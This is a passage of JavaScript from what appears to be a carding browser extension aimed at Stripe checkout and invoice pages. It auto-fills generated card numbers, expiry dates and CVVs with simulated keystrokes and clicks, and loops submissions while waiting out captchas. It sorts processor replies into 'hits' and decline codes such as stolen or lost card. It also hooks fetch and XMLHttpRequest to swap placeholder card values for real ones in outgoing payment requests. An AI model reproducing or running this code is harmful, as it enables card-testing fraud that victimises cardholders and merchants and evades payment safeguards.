      const title = iframe.title || '';

      const isCardNumber = name.includes('cardNumber') || title.toLowerCase().includes('card number');
      const isExpiry = name.includes('cardExpiry') || title.toLowerCase().includes('expir');
      const isCvc = name.includes('cardCvc') || title.toLowerCase().includes('cvc') || title.toLowerCase().includes('security');

      try {
        const rect = iframe.getBoundingClientRect();
        if (rect.width > 0 && rect.height > 0) {
          const x = rect.left + rect.width / 2;
          const y = rect.top + rect.height / 2;

          const elementAtPoint = document.elementFromPoint(x, y);
          if (elementAtPoint) {
            elementAtPoint.click();
            await wait(20);
          }
        }
      } catch (e) {
      }
    }

    const stripeInputWrappers = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
    for (const wrapper of stripeInputWrappers) {
      const rect = wrapper.getBoundingClientRect();
      if (rect.width > 0 && rect.height > 0) {
        wrapper.click();
        await wait(20);
      }
    }

    if (isInvoiceStripePage()) {
      await simulateStripeElementsInput(card, mm, yy, cvv);
    }
  }

  async function simulateStripeElementsInput(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    async function typeText(text, delay = 50) {
      for (const char of text) {
        const keydownEvent = new KeyboardEvent('keydown', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const keypressEvent = new KeyboardEvent('keypress', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const inputEvent = new InputEvent('input', {
          data: char,
          inputType: 'insertText',
          bubbles: true,
          cancelable: true
        });

        const keyupEvent = new KeyboardEvent('keyup', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        document.activeElement?.dispatchEvent(keydownEvent);
        document.activeElement?.dispatchEvent(keypressEvent);
        document.activeElement?.dispatchEvent(inputEvent);
        document.activeElement?.dispatchEvent(keyupEvent);

        await wait(delay);
      }
    }

    async function pressTab() {
      const tabDown = new KeyboardEvent('keydown', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      const tabUp = new KeyboardEvent('keyup', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      document.activeElement?.dispatchEvent(tabDown);
      document.activeElement?.dispatchEvent(tabUp);
      await wait(140);
    }

    async function findAndClickField(selectors, fieldName) {
      for (const selector of selectors) {
        try {
          const elements = document.querySelectorAll(selector);
          for (const element of elements) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              element.click();
              element.focus?.();
              await wait(140);
              return true;
            }
          }
        } catch (e) { }
      }
      return false;
    }

    const cardNumberSelectors = [
      '[class*="CardNumberElement"]',
      '[class*="cardNumber"]',
      '[data-field="number"]',
      'iframe[title*="card number" i]',
      'iframe[name*="cardNumber"]',
      'input[placeholder*="0000"]',
      'input[placeholder*="1234"]',
      'input[autocomplete="cc-number"]',
      '[class*="CardNumber"] input',
      '[class*="card-number"] input'
    ];

    let cardFieldFound = await findAndClickField(cardNumberSelectors, 'card number');

    if (!cardFieldFound) {
      const stripeElements = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
      for (const el of stripeElements) {
        const rect = el.getBoundingClientRect();
        if (rect.width > 100 && rect.height > 20) {
          el.click();
          await wait(200);
          cardFieldFound = true;
          break;
        }
      }
    }

    if (!cardFieldFound) {
      const paymentSection = document.querySelector('[class*="payment"], [class*="Payment"], [class*="card"], [class*="Card"], form');
      if (paymentSection) {
        const firstInput = paymentSection.querySelector('input[type="text"], input:not([type]), [contenteditable]');
        if (firstInput) {
          firstInput.click();
          firstInput.focus?.();
          await wait(140);
          cardFieldFound = true;
        }
      }
    }

    if (cardFieldFound) {
      await typeText(card, 20);
      await wait(200);

      await pressTab();
      await typeText(mm + yy, 20);
      await wait(200);

      await pressTab();
      await typeText(cvv, 20);
      await wait(200);
    }

  }

  function isSubmitButtonAvailable() {
    const submitButton = document.querySelector(".SubmitButton-IconContainer")
    if (submitButton) {
      const button = submitButton.closest(".SubmitButton")
      if (button) {
        const computedStyle = window.getComputedStyle(button)
        if (!button.disabled &&
          !button.classList.contains("SubmitButton--incomplete") &&
          computedStyle.opacity !== "0" &&
          computedStyle.visibility !== "hidden" &&
          computedStyle.display !== "none") {
          return true;
        }
      }
    }

    if (isInvoiceStripePage()) {
      const payButtons = document.querySelectorAll('button');
      for (const btn of payButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if ((text === 'pay' || text.startsWith('pay ') || text.includes('pay $')) && !btn.disabled) {
          return true;
        }
      }
    }

    return false;
  }
  async function waitForSubmitButton(timeout = 10000) {
    const startTime = Date.now()
    return new Promise((resolve) => {
      const checkButton = () => {
        if (isSubmitButtonAvailable()) {
          resolve(true)
        } else if (!isAutoSubmitting || Date.now() - startTime > timeout) {
          resolve(false)
        } else {
          setTimeout(checkButton, 50)
        }
      }
      checkButton()
    })
  }
  async function handleAutoSubmit() {
    while (isAutoSubmitting && !hasHit) {
      if (hasHit) {
        break
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 1000))
      }

      currentCardProcessed = false
      cardAttemptStartTime = Date.now()
      await autoFillForm()
      if (hasHit) break
      const buttonReady = await waitForSubmitButton()
      if (!isAutoSubmitting || hasHit || !buttonReady) break
      const buttonContainer = document.querySelector(".SubmitButton-IconContainer")
      if (buttonContainer) {
        const button = buttonContainer.closest(".SubmitButton") || buttonContainer.closest("button")
        if (button) button.click()
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 500))
      }

      await waitForResponse(15000)
      if (!isAutoSubmitting || hasHit) break
      await new Promise((resolve) => setTimeout(resolve, 500))
      await waitForSubmitButton()
    }
    if (hasHit) {
      stopAutoSubmit()
    }
  }

  let hasClickedCardTab = false;

  function clickCardPaymentTab() {
    if (hasClickedCardTab) return;

    try {
      function simulateRealClick(element) {
        if (!element) return false;

        if (element.tagName === 'INPUT') {
          const label = element.closest('label') || document.querySelector(`label[for="${element.id}"]`);
          if (label) {
            label.click();
            return true;
          }

          const clickableParent = element.closest('[role="radio"]') ||
            element.closest('[role="tab"]') ||
            element.closest('[class*="Tab"]') ||
            element.closest('[class*="Option"]') ||
            element.closest('[class*="Method"]') ||
            element.parentElement;
          if (clickableParent && clickableParent !== element) {
            clickableParent.click();
            return true;
          }

          element.checked = true;
          element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new Event('input', { bubbles: true }));
          element.dispatchEvent(new Event('change', { bubbles: true }));
          return true;
        }

        element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
        return true;
      }

      const allLabels = document.querySelectorAll('label, [role="radio"], [role="tab"], [class*="Tab"], [class*="Option"]');
      for (const el of allLabels) {
        const text = (el.textContent || el.innerText || '').trim();
        if (text === 'Card' || text.startsWith('Card ') || text.match(/^Card\s*$/i)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            simulateRealClick(el);
            hasClickedCardTab = true;

            const innerInput = el.querySelector('input[type="radio"]');
            if (innerInput) {
              innerInput.checked = true;
              innerInput.dispatchEvent(new Event('change', { bubbles: true }));
            }
            return true;
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"], input[name*="payment"][value="card"]');
      if (cardInput) {

        const container = cardInput.closest('label') ||
          cardInput.closest('[role="radio"]') ||
          cardInput.closest('[role="tab"]') ||
          cardInput.closest('[class*="Tab"]') ||
          cardInput.closest('[class*="Option"]') ||
          cardInput.closest('[class*="Method"]') ||
          cardInput.closest('div[class]');

        if (container && container !== cardInput) {
          simulateRealClick(container);
        }

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));

        hasClickedCardTab = true;
        return true;
      }

      const cardTabSelectors = [
        '[data-testid="card-tab"]',
        '[data-testid="CARD-tab"]',
        '[data-testid*="card" i]',
        'button[data-value="card"]',
        '[role="tab"][data-value="card"]',
        '[class*="PaymentMethodSelector"] [class*="Tab"]:first-child',
        '[class*="PaymentMethod"] button:first-child',
        '[class*="Tab"][class*="card" i]',
        '.p-TabList button:first-child',
        '[role="tablist"] button:first-child',
        '[role="radiogroup"] > div:first-child',
        '[aria-label*="Card" i]',
      ];

      for (const selector of cardTabSelectors) {
        try {
          const element = document.querySelector(selector);
          if (element) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              simulateRealClick(element);
              hasClickedCardTab = true;
              return true;
            }
          }
        } catch (e) { }
      }

      const paymentArea = document.querySelector('[class*="PaymentMethod"], [class*="payment-method"], [role="radiogroup"]');
      if (paymentArea) {
        const firstRadio = paymentArea.querySelector('input[type="radio"], [role="radio"]');
        if (firstRadio) {
          const container = firstRadio.closest('label') || firstRadio.closest('div') || firstRadio;
          simulateRealClick(container);
          if (firstRadio.tagName === 'INPUT') {
            firstRadio.checked = true;
            firstRadio.dispatchEvent(new Event('change', { bubbles: true }));
          }
          hasClickedCardTab = true;
          return true;
        }
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  function simulateRealTap(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const actualElement = document.elementFromPoint(x, y) || element;

    const eventOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      buttons: 1,
      detail: 1,
      composed: true
    };

    actualElement.dispatchEvent(new MouseEvent('mouseenter', { ...eventOptions, bubbles: false }));
    actualElement.dispatchEvent(new MouseEvent('mouseover', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousemove', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousedown', eventOptions));
    actualElement.focus?.();
    actualElement.dispatchEvent(new MouseEvent('mouseup', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('click', eventOptions));

    if (actualElement !== element) {
      element.dispatchEvent(new MouseEvent('click', eventOptions));
    }

    return true;
  }

  function forceClick(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const pointerOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      pointerId: 1,
      pointerType: 'mouse',
      isPrimary: true,
      button: 0,
      buttons: 1,
      composed: true
    };

    element.dispatchEvent(new PointerEvent('pointerover', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerenter', { ...pointerOptions, bubbles: false }));
    element.dispatchEvent(new PointerEvent('pointerdown', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerup', pointerOptions));

    const clickEvent = new MouseEvent('click', {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      detail: 1,
      composed: true
    });

    element.dispatchEvent(clickEvent);

    element.click?.();

    return true;
  }

  async function openCardDrawer() {
    if (hasClickedCardTab) return;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const isDrawerOpen = () => {

      const allInputs = document.querySelectorAll('input');
      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
        if (placeholder.includes('card number') || placeholder.includes('1234') ||
          ariaLabel.includes('card number') || ariaLabel.includes('credit card')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 10 && rect.width > 50) {
            return true;
          }
        }
      }

      const cardSections = document.querySelectorAll('[class*="CardField"], [class*="cardField"], [class*="CardNumberField"], [class*="card-number"]');
      for (const section of cardSections) {
        const rect = section.getBoundingClientRect();
        if (rect.height > 40 && rect.width > 100) {
          return true;
        }
      }

      const allLabels = document.querySelectorAll('label, span, div');
      for (const label of allLabels) {
        const text = (label.textContent || '').trim().toLowerCase();
        if (text === 'card number' || text === 'card information') {
          const rect = label.getBoundingClientRect();
          if (rect.height > 0 && rect.width > 0) {
            const parent = label.closest('div');
            if (parent) {
              const nearbyInput = parent.querySelector('input, iframe');
              if (nearbyInput) {
                const inputRect = nearbyInput.getBoundingClientRect();
                if (inputRect.height > 10) {
                  return true;
                }
              }
            }
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"]');
      if (cardInput) {
        let container = cardInput.closest('[class*="Option"]') || cardInput.closest('[class*="AccordionItem"]') || cardInput.closest('[role="radio"]')?.parentElement;
        if (container) {
          const rect = container.getBoundingClientRect();
          if (rect.height > 150) {
            return true;
          }
        }
      }

      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        if (placeholder.includes('mm') || placeholder.includes('yy') || placeholder.includes('cvc') || placeholder.includes('cvv')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 0) {
            return true;
          }
        }
      }

      return false;
    };

    const cardInput = document.querySelector('input[value="card"]');

    if (!cardInput) {
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
      hasClickedCardTab = true;
      return false;
    }

    if (cardInput.checked) {
      await wait(80);
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
    }

    const getClickTargets = () => {
      const targets = [];

      const accordionTitle = document.querySelector('[class*="AccordionItemCover-title"]:not([class*="Container"])');
      const accordionTitleContainer = document.querySelector('[class*="AccordionItemCover-titleContai"]');

      const allAccordionTitles = document.querySelectorAll('[class*="AccordionItem"] [class*="title"], [class*="Accordion"] [class*="Title"]');
      for (const title of allAccordionTitles) {
        const text = (title.textContent || '').toLowerCase();
        if (text.includes('card') && !text.includes('gift')) {
          targets.push(title);
        }
      }

      const accordionItem = cardInput.closest('[class*="AccordionItem"]');
      if (accordionItem) {
        const header = accordionItem.querySelector('[class*="Cover"], [class*="Header"], [class*="Title"]');
        if (header) targets.push(header);
        targets.push(accordionItem);
      }

      let parent = cardInput.parentElement;
      for (let i = 0; i < 5 && parent; i++) {
        if (parent.tagName !== 'BODY' && parent.tagName !== 'HTML') {
          if (!targets.includes(parent)) {
            targets.push(parent);
          }
        }
        parent = parent.parentElement;
      }

      const label = cardInput.closest('label');
      const radio = cardInput.closest('[role="radio"]');
      const option = cardInput.closest('[class*="Option"]');

      if (label && !targets.includes(label)) targets.unshift(label);
      if (radio && !targets.includes(radio)) targets.unshift(radio);
      if (option && !targets.includes(option)) targets.unshift(option);

      return targets.filter(t => {
        const r = t.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      });
    };

    const targets = getClickTargets();

    for (let attempt = 1; attempt <= 3; attempt++) {

      for (let i = 0; i < targets.length; i++) {
        const target = targets[i];
        const tagInfo = `${target.tagName}${target.className ? '.' + String(target.className).split(' ')[0].substring(0, 30) : ''}`;

        forceClick(target);
        await wait(60);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        simulateRealTap(target);
        await wait(60);

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));

        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.click();
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.scrollIntoView({ behavior: 'instant', block: 'center' });
        await wait(40);
        simulateRealTap(target);
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }
      }

      cardInput.scrollIntoView({ behavior: 'instant', block: 'center' });
      await wait(40);

      simulateRealTap(cardInput);

      try {
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'checked').set;
        nativeInputValueSetter.call(cardInput, true);
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
      } catch (e) { }

      await wait(200);

      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }

      await wait(60);
    }

    hasClickedCardTab = true;
    return false;
  }

  let hasClickedInvoiceCardSection = false;

  async function handleInvoiceAutomation() {
    if (!isInvoiceStripePage()) return;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    await wait(300);

    if (!hasClickedInvoiceCardSection) {
      const cardSectionSelectors = [
        '[class*="Card"][class*="Section"]',
        '[class*="PaymentMethod"] [class*="Card"]',
        'button:has-text("Card")',
        'div[role="button"]:has-text("Card")',
        '[class*="Accordion"] [class*="title"]',
        '[class*="payment"] [class*="option"]'
      ];

      const allClickables = document.querySelectorAll('button, [role="button"], [class*="Section"], [class*="Option"], [class*="Method"], label');
      for (const el of allClickables) {
        const text = (el.textContent || '').trim();
        if (text === 'Card' || /^Card$/i.test(text) || (text.includes('Card') && text.length < 20)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            forceClick(el);
            hasClickedInvoiceCardSection = true;
            await wait(150);
            break;
          }
        }
      }
    }

    const findPayButton = () => {
      const payButtonSelectors = [
        'button[class*="Pay"]',
        'button[type="submit"]',
        '[class*="SubmitButton"]',
        '[class*="PayButton"]',
        'button[data-testid*="pay"]',
        'button[data-testid*="submit"]'
      ];

      for (const selector of payButtonSelectors) {
        const btn = document.querySelector(selector);
        if (btn) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      return null;
    };

    window.invoicePayButton = findPayButton();
    if (window.invoicePayButton) {
    }

    return true;
  }

  async function clickInvoicePayButton() {
    const payBtn = window.invoicePayButton || (() => {
      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }
      return null;
    })();

    if (payBtn) {
      forceClick(payBtn);
      return true;
    }

    return false;
  }

  function startAutoSubmit() {
    if (isAutoSubmitting) return
    isAutoSubmitting = true
    successStartTime = Date.now()

    if (isInvoiceStripePage()) {
      handleInvoiceAutomation().then(() => {
        handleAutoSubmit()
      });
    } else {
      openCardDrawer().then(() => {
        handleAutoSubmit()
      });
    }

    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "■ Stop"
      autocoBtn.classList.add("active")
    }
  }
  function stopAutoSubmit() {
    isAutoSubmitting = false
    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "▶ Start"
      autocoBtn.classList.remove("active")
    }
  }
  const processedResponses = new Set()
  let responseCounter = 0
  let currentCardProcessed = false
  let lastProcessedCard = ""
  let responseReceived = false
  let responseResolve = null
  function waitForResponse(timeout = 15000) {
    return new Promise((resolve) => {
      responseReceived = false
      responseResolve = resolve
      setTimeout(() => {
        if (!responseReceived) {
          responseReceived = true
          if (responseResolve) responseResolve()
        }
      }, timeout)
    })
  }
  function signalResponseReceived() {
    responseReceived = true
    if (responseResolve) {
      responseResolve()
      responseResolve = null
    }
  }
  function processResponseData(json, responseId) {
    if (responseId && processedResponses.has(responseId)) return
    if (responseId) {
      processedResponses.add(responseId)
      setTimeout(() => processedResponses.delete(responseId), 10000)
    }
    const currentCard = window.generatedCardFull || ""
    if (currentCardProcessed && currentCard === lastProcessedCard) {
      return
    }
    function findSuccessStatus(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return false
      if (obj.status === "succeeded") return true
      if (obj.intent_status === "succeeded") return true
      if (obj.paid === true) return true
      if (obj.success === true) return true
      if (obj.approved === true) return true
      if (obj.result === "success") return true
      if (obj.state === "succeeded") return true
      if (obj.payment_status === "paid") return true
      if (obj.charge_status === "succeeded") return true
      if (obj.payment_intent?.status === "succeeded") return true
      if (obj.paymentIntent?.status === "succeeded") return true
      if (obj.charge?.status === "succeeded") return true
      if (obj.charge?.paid === true) return true
      if (obj.transaction?.status === "approved") return true
      if (obj.transaction?.status === "succeeded") return true
      if (obj.data?.status === "succeeded") return true
      if (obj.data?.paid === true) return true
      if (obj.response?.status === "succeeded") return true
      if (obj.payment?.status === "succeeded") return true
      if (obj.payment?.paid === true) return true
      if (Array.isArray(obj.data) && obj.data[0]?.status === "succeeded") return true
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object" && obj[key] !== null) {
          if (findSuccessStatus(obj[key], depth + 1)) return true
        }
      }
      return false
    }
    function findDeclineCode(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return null
      if (obj.decline_code) return obj.decline_code
      if (obj.error?.decline_code) return obj.error.decline_code
      if (obj.error?.code) return obj.error.code
      if (obj.code && typeof obj.code === "string" && obj.code.includes("_")) return obj.code
      if (obj.failure_code) return obj.failure_code
      if (obj.outcome?.reason) return obj.outcome.reason
      if (obj.outcome?.type === "issuer_declined") return obj.outcome.network_status || "declined"
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object") {
          const found = findDeclineCode(obj[key], depth + 1)
          if (found) return found
        }
      }
      return null
    }
    const isSuccess = findSuccessStatus(json)
    if (isSuccess) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      handleSuccess()
      return
    }
    extractPaymentData(json)
    let declineCode = findDeclineCode(json)
    if (!declineCode) {
      const message = json.error?.message || json.message || json.error_message || ""
      if (message) {
        const msgLower = message.toLowerCase()
        if (msgLower.includes("insufficient funds")) declineCode = "insufficient_funds"
        else if (msgLower.includes("card declined")) declineCode = "card_declined"
        else if (msgLower.includes("expired card")) declineCode = "expired_card"
        else if (msgLower.includes("incorrect cvc")) declineCode = "incorrect_cvc"
        else if (msgLower.includes("incorrect number")) declineCode = "incorrect_number"
        else if (msgLower.includes("invalid cvc")) declineCode = "invalid_cvc"
        else if (msgLower.includes("processing error")) declineCode = "processing_error"
        else if (msgLower.includes("do not honor")) declineCode = "do_not_honor"
        else if (msgLower.includes("lost card")) declineCode = "lost_card"
        else if (msgLower.includes("stolen card")) declineCode = "stolen_card"
        else if (msgLower.includes("fraud")) declineCode = "fraudulent"
        else if (msgLower.includes("invalid account")) declineCode = "invalid_account"
        else if (msgLower.includes("generic decline")) declineCode = "generic_decline"
      }
    }
    if (declineCode && (declineCode.toLowerCase().includes("timeout") || declineCode === "request_timeout")) {
      return
    }
    if (declineCode) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      showWarning(declineCode, "error")
      if (window.generatedCardFull) {
        const parts = window.generatedCardFull.split("|")
        addToHistory(parts[0], parts[1], parts[2], parts[3], declineCode)
      }
      const stopCodes = [
        "checkout_not_active_session",
        "checkout_session_expired",
        "payment_intent_unexpected_state",
        "resource_missing",
        "session_expired",
        "expired_session",
        "invalid_session",
      ]
      const declineLower = declineCode.toLowerCase()

      const isSessionExpired = declineLower.includes("session") ||
        (declineLower.includes("expired") && declineLower !== "expired_card")
      if (stopCodes.includes(declineLower) || isSessionExpired) {
        autoStopOnError(declineCode)
      }
    }
  }
  function autoStopOnError(reason) {
    if (isAutoSubmitting) {
      isAutoSubmitting = false
      const autocoBtn = document.getElementById("autocoBtn")
      if (autocoBtn) {
        autocoBtn.textContent = "▶ Start"
        autocoBtn.classList.remove("active")
      }
      if (window._lxUpdateCtrl) window._lxUpdateCtrl(false)
      showWarning("Auto-stopped: " + reason, "error")
    }
  }
  const originalXHR = window.XMLHttpRequest
  window.XMLHttpRequest = () => {
    const xhr = new originalXHR()
    const originalOpen = xhr.open
    const originalSend = xhr.send
    const xhrId = ++responseCounter
    xhr.addEventListener("load", function () {
      try {
        if (this.responseText) {
          const json = JSON.parse(this.responseText)
          processResponseData(json, "xhr_" + xhrId)
        }
      } catch (e) { }
    })
    xhr.addEventListener("error", () => { })
    xhr.addEventListener("timeout", () => { })
    xhr.open = function (method, url) {
      if (url && typeof url === "string" && realCardValues.cardNumber) {
        if (url.includes("card[number]=0000000000000000")) {
          url = url.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (url.includes("card[exp_month]=01") && url.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          url = url.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          url = url.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (url.includes("card[cvc]=000")) {
          url = url.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalOpen.apply(xhr, arguments)
    }
    xhr.send = function (body) {
      if (body && typeof body === "string" && realCardValues.cardNumber) {
        if (body.includes("card[number]=0000000000000000")) {
          body = body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (body.includes("card[exp_month]=01") && body.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          body = body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          body = body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (body.includes("card[cvc]=000")) {
          body = body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalSend.apply(xhr, [body])
    }
    return xhr
  }
  const originalFetch = window.fetch
  window.fetch = async function (input, init) {
    if (init && init.body && typeof init.body === "string" && realCardValues.cardNumber) {
      if (init.body.includes("card[number]=0000000000000000")) {
        init.body = init.body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
      }
      if (init.body.includes("card[exp_month]=01") && init.body.includes("card[exp_year]=30")) {
        const parts = realCardValues.cardExpiry.split("/")
        init.body = init.body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
        init.body = init.body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
      }
      if (init.body.includes("card[cvc]=000")) {
        init.body = init.body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
      }
    }
    const fetchId = "fetch_" + ++responseCounter
    try {
      const response = await originalFetch.apply(this, [input, init])
      const url = typeof input === "string" ? input : input?.url || ""
      const contentType = response.headers?.get("content-type") || ""
      if (contentType.includes("application/json")) {
        try {
          const cloned = response.clone()
          const text = await cloned.text()
          if (text) {
            const json = JSON.parse(text)
            processResponseData(json, fetchId)
          }
        } catch (e) { }
      }
      return response
    } catch (fetchError) {
      throw fetchError
    }
  }
  async function createOverlay() {
    if (isCreatingOverlay) return
    isCreatingOverlay = true
    const key = "cardGeneratorHit_" + window.location.href

    // ============= PARALLEL: Hit check + License check + Load all data =============
    // Run all three independent tasks simultaneously for faster startup
    let savedToken = "";

    const hitCheckPromise = new Promise(resolve => {
      if (window.LynixStorage && window.LynixStorage.loadAllData) {
        window.LynixStorage.loadAllData((data) => {
          resolve(data[key] === "true" || data[key] === true);
        });
      } else {
        resolve(localStorage.getItem(key) === "true");
      }
    });

    const licensePromise = checkLicenseKey();

    const dataLoadPromise = new Promise((resolve) => {
      if (window.LynixStorage && window.LynixStorage.loadAllData) {
        window.LynixStorage.loadAllData((data) => {

          // Load saved BINs
          if (data[K.SAVED_BINS] && Array.isArray(data[K.SAVED_BINS])) {
            savedBINs = data[K.SAVED_BINS];
          }

          // Load user session
          if (data[K.TOKEN]) {
            savedToken = data[K.TOKEN];
            userId = data[K.USER_ID] || "";
            userFirstName = data[K.FIRST_NAME] || "";
            savedId = userId;

            // Sync to localStorage for backwards compatibility
            localStorage.setItem(K.TOKEN, savedToken);
            localStorage.setItem(K.USER_ID, userId);
            localStorage.setItem(K.FIRST_NAME, userFirstName);
          }

          // Load toggle states
          if (data[K.TOGGLE_TG_FORWARD] !== undefined) {
            tgForwardEnabled = data[K.TOGGLE_TG_FORWARD] !== false;
          }

          // Load custom name/email
          if (data[K.CUSTOM_NAME]) {
            customName = data[K.CUSTOM_NAME];
            localStorage.setItem(K.CUSTOM_NAME, customName);
          }
          if (data[K.CUSTOM_EMAIL]) {
            customEmail = data[K.CUSTOM_EMAIL];
            localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
          }

          // Load saved ID
          if (data[K.SAVED_ID]) {
            savedId = data[K.SAVED_ID];
            localStorage.setItem(K.USER_ID, savedId);
          }

          resolve();
        });
      } else {
        // Fallback to localStorage if storage module not loaded
        const storedBins = localStorage.getItem(K.SAVED_BINS)
        if (storedBins) {
          try {
            savedBINs = JSON.parse(storedBins)
          } catch (e) { }
        }
        if (savedBINs.length === 0) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
